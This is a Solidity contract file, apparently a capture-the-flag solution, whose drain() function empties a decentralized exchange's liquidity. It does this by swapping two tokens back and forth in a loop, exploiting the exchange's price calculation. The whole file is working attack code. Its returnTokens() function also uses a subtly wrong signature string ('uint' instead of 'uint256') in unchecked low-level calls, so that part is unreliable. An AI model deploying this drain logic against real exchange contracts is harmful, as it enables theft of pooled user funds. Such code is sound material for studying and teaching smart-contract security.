// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Dex {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function swap(address from, address to, uint amount) external;
  function approve(address spender, uint amount) external;
  function balanceOf(address token, address account) external view returns (uint);
}

contract Kex {
    function drain(Dex dex) public {
        dex.approve(address(dex), type(uint256).max);
        address token1 = dex.token1();
        address token2 = dex.token2();
        while(true) {
            uint dexAmt = dex.balanceOf(token1, address(dex));
            if(dexAmt == 0) break;
            uint amt = dex.balanceOf(token1, address(this));
            if(amt > dexAmt) amt = dexAmt;
            dex.swap(token1, token2, amt);
            (token1, token2) = (token2, token1);
        }
    }

    function returnTokens(Dex dex) public {
        dex.token1().call(abi.encodeWithSignature('transfer(address,uint)', msg.sender, 10));
        dex.token2().call(abi.encodeWithSignature('transfer(address,uint)', msg.sender, 10));
    }
}
